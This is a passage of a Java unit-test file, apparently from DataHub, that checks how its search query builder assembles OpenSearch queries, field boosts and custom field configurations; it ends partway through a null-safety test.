package com.linkedin.metadata.search.query.request;

import static com.linkedin.datahub.graphql.resolvers.search.SearchUtils.AUTO_COMPLETE_ENTITY_TYPES;
import static com.linkedin.datahub.graphql.resolvers.search.SearchUtils.SEARCHABLE_ENTITY_TYPES;
import static com.linkedin.metadata.search.elasticsearch.index.entity.v2.V2LegacySettingsBuilder.TEXT_SEARCH_ANALYZER;
import static com.linkedin.metadata.search.elasticsearch.index.entity.v2.V2LegacySettingsBuilder.URN_SEARCH_ANALYZER;
import static com.linkedin.metadata.search.elasticsearch.query.request.SearchQueryBuilder.STRUCTURED_QUERY_PREFIX;
import static io.datahubproject.test.search.SearchTestUtils.TEST_OS_SEARCH_CONFIG;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.when;
import static org.testng.Assert.assertEquals;
import static org.testng.Assert.assertFalse;
import static org.testng.Assert.assertNotNull;
import static org.testng.Assert.assertNull;
import static org.testng.Assert.assertTrue;

import com.fasterxml.jackson.dataformat.yaml.YAMLMapper;
import com.google.common.collect.ImmutableList;
import com.linkedin.data.schema.DataSchema;
import com.linkedin.data.schema.PathSpec;
import com.linkedin.data.template.SetMode;
import com.linkedin.metadata.TestEntitySpecBuilder;
import com.linkedin.metadata.config.search.CustomConfiguration;
import com.linkedin.metadata.config.search.ExactMatchConfiguration;
import com.linkedin.metadata.config.search.PartialConfiguration;
import com.linkedin.metadata.config.search.SearchConfiguration;
import com.linkedin.metadata.config.search.SearchValidationConfiguration;
import com.linkedin.metadata.config.search.WordGramConfiguration;
import com.linkedin.metadata.config.search.custom.CustomSearchConfiguration;
import com.linkedin.metadata.config.search.custom.FieldConfiguration;
import com.linkedin.metadata.config.search.custom.QueryConfiguration;
import com.linkedin.metadata.config.search.custom.SearchFields;
import com.linkedin.metadata.entity.validation.ValidationException;
import com.linkedin.metadata.models.EntitySpec;
import com.linkedin.metadata.models.SearchableFieldSpec;
import com.linkedin.metadata.models.annotation.SearchableAnnotation;
import com.linkedin.metadata.models.registry.EntityRegistry;
import com.linkedin.metadata.query.SearchFlags;
import com.linkedin.metadata.search.elasticsearch.query.request.SearchFieldConfig;
import com.linkedin.metadata.search.elasticsearch.query.request.SearchQueryBuilder;
import com.linkedin.util.Pair;
import io.datahubproject.metadata.context.OperationContext;
import io.datahubproject.metadata.context.SearchContext;
import io.datahubproject.test.metadata.context.TestOperationContexts;
import io.datahubproject.test.search.config.SearchCommonTestConfiguration;
import java.io.IOException;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;
import java.util.Map;
import java.util.Optional;
import java.util.Set;
import java.util.stream.Collectors;
import java.util.stream.Stream;
import org.opensearch.index.query.BoolQueryBuilder;
import org.opensearch.index.query.MatchAllQueryBuilder;
import org.opensearch.index.query.MatchPhrasePrefixQueryBuilder;
import org.opensearch.index.query.MatchPhraseQueryBuilder;
import org.opensearch.index.query.QueryBuilder;
import org.opensearch.index.query.QueryStringQueryBuilder;
import org.opensearch.index.query.SimpleQueryStringBuilder;
import org.opensearch.index.query.TermQueryBuilder;
import org.opensearch.index.query.functionscore.FunctionScoreQueryBuilder;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.context.annotation.Import;
import org.springframework.test.context.testng.AbstractTestNGSpringContextTests;
import org.testng.annotations.Test;

@Import(SearchCommonTestConfiguration.class)
public class SearchQueryBuilderTest extends AbstractTestNGSpringContextTests {

  @Autowired
  @Qualifier("queryOperationContext")
  private OperationContext operationContext;

  @Autowired
  @Qualifier("defaultTestCustomSearchConfig")
  private CustomSearchConfiguration customSearchConfiguration;

  public static SearchConfiguration testQueryConfig;

  static {
    testQueryConfig = TEST_OS_SEARCH_CONFIG.getSearch();
    testQueryConfig.setMaxTermBucketSize(20);

    ExactMatchConfiguration exactMatchConfiguration = new ExactMatchConfiguration();
    exactMatchConfiguration.setExclusive(false);
    exactMatchConfiguration.setExactFactor(10.0f);
    exactMatchConfiguration.setWithPrefix(true);
    exactMatchConfiguration.setPrefixFactor(6.0f);
    exactMatchConfiguration.setCaseSensitivityFactor(0.7f);
    exactMatchConfiguration.setEnableStructured(true);

    WordGramConfiguration wordGramConfiguration = new WordGramConfiguration();
    wordGramConfiguration.setTwoGramFactor(1.2f);
    wordGramConfiguration.setThreeGramFactor(1.5f);
    wordGramConfiguration.setFourGramFactor(1.8f);

    PartialConfiguration partialConfiguration = new PartialConfiguration();
    partialConfiguration.setFactor(0.4f);
    partialConfiguration.setUrnFactor(0.7f);

    SearchValidationConfiguration searchValidationConfiguration =
        new SearchValidationConfiguration();
    searchValidationConfiguration.setMaxQueryLength(500);

    testQueryConfig.setExactMatch(exactMatchConfiguration);
    testQueryConfig.setWordGram(wordGramConfiguration);
    testQueryConfig.setPartial(partialConfiguration);
    testQueryConfig.setValidation(searchValidationConfiguration);
  }

  public static final SearchQueryBuilder TEST_BUILDER =
      new SearchQueryBuilder(testQueryConfig, null);

  public OperationContext opContext = TestOperationContexts.systemContextNoSearchAuthorization();

  @Test
  public void testQueryBuilderFulltext() {
    FunctionScoreQueryBuilder result =
        (FunctionScoreQueryBuilder)
            TEST_BUILDER.buildQuery(
                opContext, ImmutableList.of(TestEntitySpecBuilder.getSpec()), "testQuery", true);
    BoolQueryBuilder mainQuery = (BoolQueryBuilder) result.query();
    List<QueryBuilder> shouldQueries = mainQuery.should();
    assertEquals(shouldQueries.size(), 2);

    BoolQueryBuilder analyzerGroupQuery = (BoolQueryBuilder) shouldQueries.get(0);

    SimpleQueryStringBuilder keywordQuery =
        (SimpleQueryStringBuilder) analyzerGroupQuery.should().get(0);
    assertEquals(keywordQuery.value(), "testQuery");
    assertEquals(keywordQuery.analyzer(), "keyword");
    Map<String, Float> keywordFields = keywordQuery.fields();
    assertEquals(keywordFields.size(), 14);

    assertEquals(keywordFields.get("urn"), 10);
    assertEquals(keywordFields.get("textArrayField"), 1);
    assertEquals(keywordFields.get("customProperties"), 1);
    assertEquals(keywordFields.get("wordGramField"), 1);
    assertEquals(keywordFields.get("nestedArrayArrayField"), 1);
    assertEquals(keywordFields.get("textFieldOverride"), 1);
    assertEquals(keywordFields.get("nestedArrayStringField"), 1);
    assertEquals(keywordFields.get("keyPart1"), 10);
    assertEquals(keywordFields.get("esObjectField"), 1);
    assertEquals(keywordFields.get("esObjectFieldFloat"), 1);
    assertEquals(keywordFields.get("esObjectFieldDouble"), 1);
    assertEquals(keywordFields.get("esObjectFieldLong"), 1);
    assertEquals(keywordFields.get("esObjectFieldInteger"), 1);
    assertEquals(keywordFields.get("esObjectFieldBoolean"), 1);

    SimpleQueryStringBuilder urnComponentQuery =
        (SimpleQueryStringBuilder) analyzerGroupQuery.should().get(1);
    assertEquals(urnComponentQuery.value(), "testQuery");
    assertEquals(urnComponentQuery.analyzer(), URN_SEARCH_ANALYZER);
    assertEquals(
        urnComponentQuery.fields(),
        Map.of(
            "nestedForeignKey", 1.0f,
            "foreignKey", 1.0f));

    SimpleQueryStringBuilder fulltextQuery =
        (SimpleQueryStringBuilder) analyzerGroupQuery.should().get(2);
    assertEquals(fulltextQuery.value(), "testQuery");
    assertEquals(fulltextQuery.analyzer(), TEXT_SEARCH_ANALYZER);
    assertEquals(
        fulltextQuery.fields(),
        Map.of(
            "textFieldOverride.delimited", 0.4f,
            "keyPart1.delimited", 4.0f,
            "nestedArrayArrayField.delimited", 0.4f,
            "urn.delimited", 7.0f,
            "textArrayField.delimited", 0.4f,
            "nestedArrayStringField.delimited", 0.4f,
            "wordGramField.delimited", 0.4f,
            "customProperties.delimited", 0.4f));

    BoolQueryBuilder boolPrefixQuery = (BoolQueryBuilder) shouldQueries.get(1);
    assertTrue(boolPrefixQuery.should().size() > 0);

    List<Pair<String, Float>> prefixFieldWeights =
        boolPrefixQuery.should().stream()
            .map(
                prefixQuery -> {
                  if (prefixQuery instanceof MatchPhrasePrefixQueryBuilder) {
                    MatchPhrasePrefixQueryBuilder builder =
                        (MatchPhrasePrefixQueryBuilder) prefixQuery;
                    return Pair.of(builder.fieldName(), builder.boost());
                  } else if (prefixQuery instanceof TermQueryBuilder) {
                    // exact
                    TermQueryBuilder builder = (TermQueryBuilder) prefixQuery;
                    return Pair.of(builder.fieldName(), builder.boost());
                  } else { // if (prefixQuery instanceof MatchPhraseQueryBuilder) {
                    // ngram
                    MatchPhraseQueryBuilder builder = (MatchPhraseQueryBuilder) prefixQuery;
                    return Pair.of(builder.fieldName(), builder.boost());
                  }
                })
            .collect(Collectors.toList());

    assertEquals(prefixFieldWeights.size(), 39);

    List.of(
            Pair.of("urn", 100.0f),
            Pair.of("urn", 70.0f),
            Pair.of("keyPart1.delimited", 16.8f),
            Pair.of("keyPart1.keyword", 100.0f),
            Pair.of("keyPart1.keyword", 70.0f),
            Pair.of("wordGramField.wordGrams2", 1.44f),
            Pair.of("wordGramField.wordGrams3", 2.25f),
            Pair.of("wordGramField.wordGrams4", 3.2399998f),
            Pair.of("wordGramField.keyword", 10.0f),
            Pair.of("wordGramField.keyword", 7.0f))
        .forEach(p -> assertTrue(prefixFieldWeights.contains(p), "Missing: " + p));

    // Validate scorer
    FunctionScoreQueryBuilder.FilterFunctionBuilder[] scoringFunctions =
        result.filterFunctionBuilders();
    assertEquals(scoringFunctions.length, 3);
  }

  @Test
  public void testQueryBuilderStructured() {
    FunctionScoreQueryBuilder result =
        (FunctionScoreQueryBuilder)
            TEST_BUILDER.buildQuery(
                opContext, ImmutableList.of(TestEntitySpecBuilder.getSpec()), "testQuery", false);
    BoolQueryBuilder mainQuery = (BoolQueryBuilder) result.query();
    List<QueryBuilder> shouldQueries = mainQuery.should();
    assertEquals(shouldQueries.size(), 2);

    QueryStringQueryBuilder keywordQuery = (QueryStringQueryBuilder) shouldQueries.get(0);
    assertEquals(keywordQuery.queryString(), "testQuery");
    assertNull(keywordQuery.analyzer());
    Map<String, Float> keywordFields = keywordQuery.fields();
    assertEquals(keywordFields.size(), 27);
    assertEquals(keywordFields.get("keyPart1").floatValue(), 10.0f);
    assertFalse(keywordFields.containsKey("keyPart3"));
    assertEquals(keywordFields.get("textFieldOverride").floatValue(), 1.0f);
    assertEquals(keywordFields.get("customProperties").floatValue(), 1.0f);
    assertEquals(keywordFields.get("esObjectField").floatValue(), 1.0f);

    // Validate scorer
    FunctionScoreQueryBuilder.FilterFunctionBuilder[] scoringFunctions =
        result.filterFunctionBuilders();
    assertEquals(scoringFunctions.length, 3);
  }

  private static final SearchQueryBuilder TEST_CUSTOM_BUILDER;

  static {
    try {
      CustomConfiguration customConfiguration = new CustomConfiguration();
      customConfiguration.setEnabled(true);
      customConfiguration.setFile("search_config_builder_test.yml");
      CustomSearchConfiguration customSearchConfiguration =
          customConfiguration.resolve(new YAMLMapper());
      TEST_CUSTOM_BUILDER = new SearchQueryBuilder(testQueryConfig, customSearchConfiguration);
    } catch (IOException e) {
      throw new RuntimeException(e);
    }
  }

  @Test
  public void testCustomSelectAll() {
    for (String triggerQuery : List.of("*", "")) {
      FunctionScoreQueryBuilder result =
          (FunctionScoreQueryBuilder)
              TEST_CUSTOM_BUILDER.buildQuery(
                  opContext, ImmutableList.of(TestEntitySpecBuilder.getSpec()), triggerQuery, true);

      BoolQueryBuilder mainQuery = (BoolQueryBuilder) result.query();
      List<QueryBuilder> shouldQueries = mainQuery.should();
      assertEquals(shouldQueries.size(), 0);
    }
  }

  @Test
  public void testCustomExactMatch() {
    for (String triggerQuery : List.of("test_table", "'single quoted'", "\"double quoted\"")) {
      FunctionScoreQueryBuilder result =
          (FunctionScoreQueryBuilder)
              TEST_CUSTOM_BUILDER.buildQuery(
                  opContext, ImmutableList.of(TestEntitySpecBuilder.getSpec()), triggerQuery, true);

      BoolQueryBuilder mainQuery = (BoolQueryBuilder) result.query();
      List<QueryBuilder> shouldQueries = mainQuery.should();
      assertEquals(shouldQueries.size(), 1, String.format("Expected query for `%s`", triggerQuery));

      BoolQueryBuilder boolPrefixQuery = (BoolQueryBuilder) shouldQueries.get(0);
      assertTrue(boolPrefixQuery.should().size() > 0);

      List<QueryBuilder> queries =
          boolPrefixQuery.should().stream()
              .map(
                  prefixQuery -> {
                    if (prefixQuery instanceof MatchPhrasePrefixQueryBuilder) {
                      // prefix
                      return (MatchPhrasePrefixQueryBuilder) prefixQuery;
                    } else if (prefixQuery instanceof TermQueryBuilder) {
                      // exact
                      return (TermQueryBuilder) prefixQuery;
                    } else { // if (prefixQuery instanceof MatchPhraseQueryBuilder) {
                      // ngram
                      return (MatchPhraseQueryBuilder) prefixQuery;
                    }
                  })
              .collect(Collectors.toList());

      assertFalse(queries.isEmpty(), "Expected queries with specific types");
    }
  }

  @Test
  public void testCustomDefault() {
    for (String triggerQuery : List.of("foo", "bar", "foo\"bar", "foo:bar")) {
      FunctionScoreQueryBuilder result =
          (FunctionScoreQueryBuilder)
              TEST_CUSTOM_BUILDER.buildQuery(
                  opContext, ImmutableList.of(TestEntitySpecBuilder.getSpec()), triggerQuery, true);

      BoolQueryBuilder mainQuery = (BoolQueryBuilder) result.query();
      List<QueryBuilder> shouldQueries = mainQuery.should();
      assertEquals(shouldQueries.size(), 3);

      List<QueryBuilder> queries =
          mainQuery.should().stream()
              .map(
                  query -> {
                    if (query instanceof SimpleQueryStringBuilder) {
                      return (SimpleQueryStringBuilder) query;
                    } else if (query instanceof MatchAllQueryBuilder) {
                      // custom
                      return (MatchAllQueryBuilder) query;
                    } else {
                      // exact
                      return (BoolQueryBuilder) query;
                    }
                  })
              .collect(Collectors.toList());

      assertEquals(queries.size(), 3, "Expected queries with specific types");

      // validate query injection
      List<QueryBuilder> mustQueries = mainQuery.must();
      assertEquals(mustQueries.size(), 1);
      TermQueryBuilder termQueryBuilder = (TermQueryBuilder) mainQuery.must().get(0);

      assertEquals(termQueryBuilder.fieldName(), "fieldName");
      assertEquals(termQueryBuilder.value().toString(), triggerQuery);
    }
  }

  /** Tests to make sure that the fields are correctly combined across search-able entities */
  @Test
  public void testGetStandardFieldsEntitySpec() {
    List<EntitySpec> entitySpecs =
        Stream.concat(SEARCHABLE_ENTITY_TYPES.stream(), AUTO_COMPLETE_ENTITY_TYPES.stream())
            .map(entityType -> entityType.toString().toLowerCase().replaceAll("_", ""))
            .map(entityType -> operationContext.getEntityRegistry().getEntitySpec(entityType))
            .collect(Collectors.toList());
    assertTrue(entitySpecs.size() > 30, "Expected at least 30 searchable entities in the registry");

    // Count of the distinct field names
    Set<String> expectedFieldNames =
        Stream.concat(
                // Standard urn fields plus entitySpec sourced fields
                Stream.of("urn", "urn.delimited"),
                entitySpecs.stream()
                    .flatMap(
                        spec ->
                            TEST_CUSTOM_BUILDER
                                .getFieldsFromEntitySpec(operationContext.getEntityRegistry(), spec)
                                .stream())
                    .map(SearchFieldConfig::fieldName))
            .collect(Collectors.toSet());

    Set<String> actualFieldNames =
        TEST_CUSTOM_BUILDER
            .getStandardFields(operationContext.getEntityRegistry(), entitySpecs)
            .stream()
            .map(SearchFieldConfig::fieldName)
            .collect(Collectors.toSet());

    assertEquals(
        actualFieldNames,
        expectedFieldNames,
        String.format(
            "Missing: %s Extra: %s",
            expectedFieldNames.stream()
                .filter(f -> !actualFieldNames.contains(f))
                .collect(Collectors.toSet()),
            actualFieldNames.stream()
                .filter(f -> !expectedFieldNames.contains(f))
                .collect(Collectors.toSet())));
  }

  @Test
  public void testGetStandardFields() {
    Set<SearchFieldConfig> fieldConfigs =
        TEST_CUSTOM_BUILDER.getStandardFields(
            mock(EntityRegistry.class), ImmutableList.of(TestEntitySpecBuilder.getSpec()));
    assertEquals(fieldConfigs.size(), 27);
    assertEquals(
        fieldConfigs.stream().map(SearchFieldConfig::fieldName).collect(Collectors.toSet()),
        Set.of(
            "nestedArrayArrayField",
            "esObjectField",
            "foreignKey",
            "keyPart1",
            "nestedForeignKey",
            "textArrayField.delimited",
            "nestedArrayArrayField.delimited",
            "wordGramField.delimited",
            "wordGramField.wordGrams4",
            "textFieldOverride",
            "nestedArrayStringField.delimited",
            "urn.delimited",
            "textArrayField",
            "keyPart1.delimited",
            "nestedArrayStringField",
            "wordGramField",
            "customProperties",
            "wordGramField.wordGrams3",
            "textFieldOverride.delimited",
            "urn",
            "wordGramField.wordGrams2",
            "customProperties.delimited",
            "esObjectFieldBoolean",
            "esObjectFieldInteger",
            "esObjectFieldDouble",
            "esObjectFieldFloat",
            "esObjectFieldLong")); // customProperties.delimited Saas only

    assertEquals(
        fieldConfigs.stream()
            .filter(field -> field.fieldName().equals("keyPart1"))
            .findFirst()
            .map(SearchFieldConfig::boost),
        Optional.of(10.0F));
    assertEquals(
        fieldConfigs.stream()
            .filter(field -> field.fieldName().equals("nestedForeignKey"))
            .findFirst()
            .map(SearchFieldConfig::boost),
        Optional.of(1.0F));
    assertEquals(
        fieldConfigs.stream()
            .filter(field -> field.fieldName().equals("textFieldOverride"))
            .findFirst()
            .map(SearchFieldConfig::boost),
        Optional.of(1.0F));

    EntitySpec mockEntitySpec = mock(EntitySpec.class);
    when(mockEntitySpec.getSearchableFieldSpecs())
        .thenReturn(
            List.of(
                new SearchableFieldSpec(
                    mock(PathSpec.class),
                    new SearchableAnnotation(
                        "fieldDoesntExistInOriginal",
                        SearchableAnnotation.FieldType.TEXT,
                        true,
                        true,
                        false,
                        false,
                        Optional.<String>empty(),
                        Optional.<String>empty(),
                        13.0,
                        Optional.<String>empty(),
                        Optional.<String>empty(),
                        Collections.<Object, Double>emptyMap(),
                        Collections.<String>emptyList(),
                        false,
                        false,
                        Optional.<String>empty(),
                        Optional.<Integer>empty(),
                        Optional.<String>empty(),
                        Optional.<Boolean>empty(),
                        Optional.<String>empty(),
                        Optional.<Boolean>empty(),
                        false),
                    mock(DataSchema.class)),
                new SearchableFieldSpec(
                    mock(PathSpec.class),
                    new SearchableAnnotation(
                        "keyPart1",
                        SearchableAnnotation.FieldType.KEYWORD,
                        true,
                        true,
                        false,
                        false,
                        Optional.<String>empty(),
                        Optional.<String>empty(),
                        20.0,
                        Optional.<String>empty(),
                        Optional.<String>empty(),
                        Collections.<Object, Double>emptyMap(),
                        Collections.<String>emptyList(),
                        false,
                        false,
                        Optional.<String>empty(),
                        Optional.<Integer>empty(),
                        Optional.<String>empty(),
                        Optional.<Boolean>empty(),
                        Optional.<String>empty(),
                        Optional.<Boolean>empty(),
                        false),
                    mock(DataSchema.class)),
                new SearchableFieldSpec(
                    mock(PathSpec.class),
                    new SearchableAnnotation(
                        "textFieldOverride",
                        SearchableAnnotation.FieldType.WORD_GRAM,
                        true,
                        true,
                        false,
                        false,
                        Optional.<String>empty(),
                        Optional.<String>empty(),
                        3.0,
                        Optional.<String>empty(),
                        Optional.<String>empty(),
                        Collections.<Object, Double>emptyMap(),
                        Collections.<String>emptyList(),
                        false,
                        false,
                        Optional.<String>empty(),
                        Optional.<Integer>empty(),
                        Optional.<String>empty(),
                        Optional.<Boolean>empty(),
                        Optional.<String>empty(),
                        Optional.<Boolean>empty(),
                        false),
                    mock(DataSchema.class))));

    fieldConfigs =
        TEST_CUSTOM_BUILDER.getStandardFields(
            mock(EntityRegistry.class),
            ImmutableList.of(TestEntitySpecBuilder.getSpec(), mockEntitySpec));
    // Same 22 from the original entity + newFieldNotInOriginal + 3 word gram fields from the
    // textFieldOverride
    assertEquals(fieldConfigs.size(), 32);
    assertEquals(
        fieldConfigs.stream().map(SearchFieldConfig::fieldName).collect(Collectors.toSet()),
        Set.of(
            "nestedArrayArrayField",
            "esObjectField",
            "foreignKey",
            "keyPart1",
            "nestedForeignKey",
            "textArrayField.delimited",
            "nestedArrayArrayField.delimited",
            "wordGramField.delimited",
            "wordGramField.wordGrams4",
            "textFieldOverride",
            "nestedArrayStringField.delimited",
            "urn.delimited",
            "textArrayField",
            "keyPart1.delimited",
            "nestedArrayStringField",
            "wordGramField",
            "customProperties",
            "wordGramField.wordGrams3",
            "textFieldOverride.delimited",
            "urn",
            "wordGramField.wordGrams2",
            "fieldDoesntExistInOriginal",
            "fieldDoesntExistInOriginal.delimited",
            "textFieldOverride.wordGrams2",
            "textFieldOverride.wordGrams3",
            "textFieldOverride.wordGrams4",
            "customProperties.delimited",
            "esObjectFieldBoolean",
            "esObjectFieldInteger",
            "esObjectFieldDouble",
            "esObjectFieldFloat",
            "esObjectFieldLong"));

    // Field which only exists in first one: Should be the same
    assertEquals(
        fieldConfigs.stream()
            .filter(field -> field.fieldName().equals("nestedForeignKey"))
            .findFirst()
            .map(SearchFieldConfig::boost),
        Optional.of(1.0F));
    // Average boost value: 10 vs. 20 -> 15
    assertEquals(
        fieldConfigs.stream()
            .filter(field -> field.fieldName().equals("keyPart1"))
            .findFirst()
            .map(SearchFieldConfig::boost),
        Optional.of(15.0F));
    // Field which added word gram fields: Original boost should be boost value averaged
    assertEquals(
        fieldConfigs.stream()
            .filter(field -> field.fieldName().equals("textFieldOverride"))
            .findFirst()
            .map(SearchFieldConfig::boost),
        Optional.of(2.0F));
  }

  @Test
  public void testStandardFieldsQueryByDefault() {
    assertTrue(
        TEST_BUILDER
            .getStandardFields(
                opContext.getEntityRegistry(),
                opContext.getEntityRegistry().getEntitySpecs().values())
            .stream()
            .allMatch(SearchFieldConfig::isQueryByDefault),
        "Expect all search fields to be queryByDefault.");
  }

  @Test
  public void testSearchFieldConfigurationInSimpleQuery() {
    // Create a custom configuration with field configurations
    CustomSearchConfiguration customConfig =
        CustomSearchConfiguration.builder()
            .fieldConfigurations(
                Map.of(
                    "minimal",
                    FieldConfiguration.builder()
                        .searchFields(
                            SearchFields.builder()
                                .replace(List.of("keyPart1", "textFieldOverride"))
                                .build())
                        .build()))
            .queryConfigurations(
                List.of(QueryConfiguration.builder().queryRegex(".*").simpleQuery(true).build()))
            .build();

    SearchQueryBuilder builderWithFieldConfig =
        new SearchQueryBuilder(testQueryConfig, customConfig);

    // Create operation context with field configuration
    OperationContext opContextWithFieldConfig = mock(OperationContext.class);
    SearchContext searchContext = mock(SearchContext.class);
    SearchFlags searchFlags = new SearchFlags().setFulltext(true).setFieldConfiguration("minimal");

    when(opContextWithFieldConfig.getEntityRegistry())
        .thenReturn(operationContext.getEntityRegistry());
    when(opContextWithFieldConfig.getObjectMapper()).thenReturn(operationContext.getObjectMapper());
    when(opContextWithFieldConfig.getSearchContext()).thenReturn(searchContext);
    when(searchContext.getSearchFlags()).thenReturn(searchFlags);

    FunctionScoreQueryBuilder result =
        (FunctionScoreQueryBuilder)
            builderWithFieldConfig.buildQuery(
                opContextWithFieldConfig,
                ImmutableList.of(TestEntitySpecBuilder.getSpec()),
                "testQuery",
                true);

    BoolQueryBuilder mainQuery = (BoolQueryBuilder) result.query();
    BoolQueryBuilder shouldQuery = (BoolQueryBuilder) mainQuery.should().get(0);
    SimpleQueryStringBuilder simpleQuery =
        (SimpleQueryStringBuilder)
            shouldQuery.should().stream()
                .filter(q -> q instanceof SimpleQueryStringBuilder)
                .findFirst()
                .orElse(null);

    assertNotNull(simpleQuery);
    Map<String, Float> fields = simpleQuery.fields();

    // Should only contain the replaced fields
    assertTrue(fields.containsKey("keyPart1"));
    assertTrue(fields.containsKey("textFieldOverride"));
    assertFalse(fields.containsKey("customProperties"));
    assertFalse(fields.containsKey("textArrayField"));
  }

  @Test
  public void testSearchFieldConfigurationWithAddRemove() {
    CustomSearchConfiguration customConfig =
        CustomSearchConfiguration.builder()
            .fieldConfigurations(
                Map.of(
                    "custom",
                    FieldConfiguration.builder()
                        .searchFields(
                            SearchFields.builder()
                                .add(List.of("nestedForeignKey"))
                                .remove(List.of("customProperties", "textArrayField"))
                                .build())
                        .build()))
            .queryConfigurations(
                List.of(QueryConfiguration.builder().queryRegex(".*").simpleQuery(true).build()))
            .build();

    SearchQueryBuilder builderWithFieldConfig =
        new SearchQueryBuilder(testQueryConfig, customConfig);

    // Create operation context with field configuration
    OperationContext opContextWithFieldConfig = mock(OperationContext.class);
    SearchContext searchContext = mock(SearchContext.class);
    SearchFlags searchFlags = new SearchFlags().setFulltext(true).setFieldConfiguration("custom");

    when(opContextWithFieldConfig.getEntityRegistry())
        .thenReturn(operationContext.getEntityRegistry());
    when(opContextWithFieldConfig.getObjectMapper()).thenReturn(operationContext.getObjectMapper());
    when(opContextWithFieldConfig.getSearchContext()).thenReturn(searchContext);
    when(searchContext.getSearchFlags()).thenReturn(searchFlags);

    FunctionScoreQueryBuilder result =
        (FunctionScoreQueryBuilder)
            builderWithFieldConfig.buildQuery(
                opContextWithFieldConfig,
                ImmutableList.of(TestEntitySpecBuilder.getSpec()),
                "testQuery",
                true);

    BoolQueryBuilder mainQuery = (BoolQueryBuilder) result.query();
    BoolQueryBuilder shouldQuery = (BoolQueryBuilder) mainQuery.should().get(0);

    // Collect all fields from simple query string builders
    Set<String> allFields =
        shouldQuery.should().stream()
            .filter(q -> q instanceof SimpleQueryStringBuilder)
            .flatMap(q -> ((SimpleQueryStringBuilder) q).fields().keySet().stream())
            .collect(Collectors.toSet());

    // nestedForeignKey should be added (it's not queryByDefault normally)
    assertTrue(allFields.contains("nestedForeignKey"));
    // customProperties and textArrayField should be removed
    assertFalse(allFields.contains("customProperties"));
    assertFalse(allFields.contains("textArrayField"));
    // Other fields should still be present
    assertTrue(allFields.contains("keyPart1"));
    assertTrue(allFields.contains("urn"));
  }

  @Test
  public void testSearchFieldConfigurationWithWildcardPatterns() {
    CustomSearchConfiguration customConfig =
        CustomSearchConfiguration.builder()
            .fieldConfigurations(
                Map.of(
                    "wildcard",
                    FieldConfiguration.builder()
                        .searchFields(SearchFields.builder().add(List.of("nestedArray.*")).build())
                        .build()))
            .queryConfigurations(
                List.of(QueryConfiguration.builder().queryRegex(".*").simpleQuery(true).build()))
            .build();

    SearchQueryBuilder builderWithFieldConfig =
        new SearchQueryBuilder(testQueryConfig, customConfig);

    // Mock context with field configuration
    OperationContext opContextWithFieldConfig = mock(OperationContext.class);
    SearchContext searchContext = mock(SearchContext.class);
    SearchFlags searchFlags = new SearchFlags().setFulltext(true).setFieldConfiguration("wildcard");

    when(opContextWithFieldConfig.getEntityRegistry())
        .thenReturn(operationContext.getEntityRegistry());
    when(opContextWithFieldConfig.getObjectMapper()).thenReturn(operationContext.getObjectMapper());
    when(opContextWithFieldConfig.getSearchContext()).thenReturn(searchContext);
    when(searchContext.getSearchFlags()).thenReturn(searchFlags);

    // Get the fields that would be configured
    Set<SearchFieldConfig> baseFields =
        builderWithFieldConfig.getStandardFields(
            operationContext.getEntityRegistry(),
            ImmutableList.of(TestEntitySpecBuilder.getSpec()));

    // The pattern should match fields starting with "nestedArray."
    assertTrue(baseFields.stream().anyMatch(f -> f.fieldName().equals("nestedArrayStringField")));
    assertTrue(baseFields.stream().anyMatch(f -> f.fieldName().equals("nestedArrayArrayField")));
  }

  @Test
  public void testSearchFieldConfigurationWithInvalidLabel() {
    CustomSearchConfiguration customConfig =
        CustomSearchConfiguration.builder()
            .fieldConfigurations(
                Map.of(
                    "valid",
                    FieldConfiguration.builder()
                        .searchFields(SearchFields.builder().replace(List.of("keyPart1")).build())
                        .build()))
            .queryConfigurations(
                List.of(QueryConfiguration.builder().queryRegex(".*").simpleQuery(true).build()))
            .build();

    SearchQueryBuilder builderWithFieldConfig =
        new SearchQueryBuilder(testQueryConfig, customConfig);

    // Test with invalid field configuration label
    OperationContext opContextWithInvalidConfig = mock(OperationContext.class);
    SearchContext searchContext = mock(SearchContext.class);
    SearchFlags searchFlags =
        new SearchFlags().setFulltext(true).setFieldConfiguration("nonexistent");

    when(opContextWithInvalidConfig.getEntityRegistry())
        .thenReturn(operationContext.getEntityRegistry());
    when(opContextWithInvalidConfig.getObjectMapper())
        .thenReturn(operationContext.getObjectMapper());
    when(opContextWithInvalidConfig.getSearchContext()).thenReturn(searchContext);
    when(searchContext.getSearchFlags()).thenReturn(searchFlags);

    // Should use default fields when label doesn't exist
    FunctionScoreQueryBuilder result =
        (FunctionScoreQueryBuilder)
            builderWithFieldConfig.buildQuery(
                opContextWithInvalidConfig,
                ImmutableList.of(TestEntitySpecBuilder.getSpec()),
                "testQuery",
                true);

    BoolQueryBuilder mainQuery = (BoolQueryBuilder) result.query();
    BoolQueryBuilder shouldQuery = (BoolQueryBuilder) mainQuery.should().get(0);

    // Should have all default fields since invalid label falls back to defaults
    Set<String> allFields =
        shouldQuery.should().stream()
            .filter(q -> q instanceof SimpleQueryStringBuilder)
            .flatMap(q -> ((SimpleQueryStringBuilder) q).fields().keySet().stream())
            .collect(Collectors.toSet());

    assertTrue(allFields.contains("customProperties"));
    assertTrue(allFields.contains("textArrayField"));
    assertTrue(allFields.contains("keyPart1"));
  }

  @Test
  public void testSearchFieldConfigurationNullSafety() {
    SearchQueryBuilder builderWithNullConfig = new SearchQueryBuilder(testQueryConfig, null);

    // Test with null field configuration in search flags
    OperationContext opContextNullConfig = mock(OperationContext.class);
    SearchContext searchContext = mock(SearchContext.class);
    SearchFlags searchFlags =
        new SearchFlags().setFulltext(true).setFieldConfiguration(null, SetMode.REMOVE_IF_NULL);

    when(opContextNullConfig.getEntityRegistry()).thenReturn(operationContext.getEntityRegistry());
    when(opContextNullConfig.getObjectMapper()).thenReturn(operationContext.getObjectMapper());
    when(opContextNullConfig.getSearchContext()).thenReturn(searchContext);
    when(searchContext.getSearchFlags()).thenReturn(searchFlags);

    // Should not throw and should use default behavior
    FunctionScoreQueryBuilder result =
        (FunctionScoreQueryBuilder)
            builderWithNullConfig.buildQuery(
                opContextNullConfig,
                ImmutableList.of(TestEntitySpecBuilder.getSpec()),
                "testQuery",
                true);

    assertNotNull(result);

    // Test with null search flags
    when(searchContext.getSearchFlags()).thenReturn(null);

    FunctionScoreQueryBuilder resultNullFlags =
        (FunctionScoreQueryBuilder)
            builderWithNullConfig.buildQuery(
                opContextNullConfig,
